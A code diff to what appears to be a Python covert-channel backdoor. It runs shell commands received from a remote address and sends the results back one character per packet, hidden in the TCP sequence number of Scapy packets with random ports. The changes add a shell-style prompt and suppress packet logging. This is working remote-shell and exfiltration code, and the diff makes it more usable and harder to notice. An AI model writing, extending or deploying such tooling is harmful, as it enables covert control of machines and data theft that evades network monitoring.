@@ -114,10 +114,13 @@ def executeCommand(srcAddress):
 	# results = os.system(command)
 	# shell = str(directory) + " > " + str(results)
 	# print shell -> send results back to client
+	directory = subprocess.Popen("pwd", shell=True, stdout=PIPE).stdout.read() 
 	results = subprocess.Popen(command, shell=True, stdout=PIPE).stdout.read()
-	print results
+	shell = "["+directory[:-1] + "]# " + results
 
-	sendThread = threading.Thread(target=sendResults, args=(str(results),srcAddress))
+	print shell
+
+	sendThread = threading.Thread(target=sendResults, args=(str(shell),srcAddress))
 	sendThread.daemon = True
 	sendThread.start()
 
@@ -127,5 +130,4 @@ def sendResults(results, address):
 	# encrypt results 
 	# for each character, send a packet to address
 	for c in results:
-		print c
-		send(IP(dst=address)/TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=ord(c)))
+		send(IP(dst=address)/TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=ord(c)), verbose=0)
